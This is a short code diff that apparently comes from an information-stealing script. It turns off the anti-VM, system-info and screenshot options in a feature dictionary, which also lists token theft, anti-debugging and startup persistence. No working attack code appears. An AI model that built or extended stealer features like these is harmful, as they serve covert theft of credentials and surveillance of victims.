@@ -443,11 +443,11 @@ def checker():
 
 def main():
     feature = {
-        "anti_vm": True,
+        "anti_vm": False,
         "anti_debug": False,
         "token": False,
-        "systeminfo": True,
-        "screenshot": True,
+        "systeminfo": False,
+        "screenshot": False,
         "startup": False,
     }
     if feature.get("token", False):
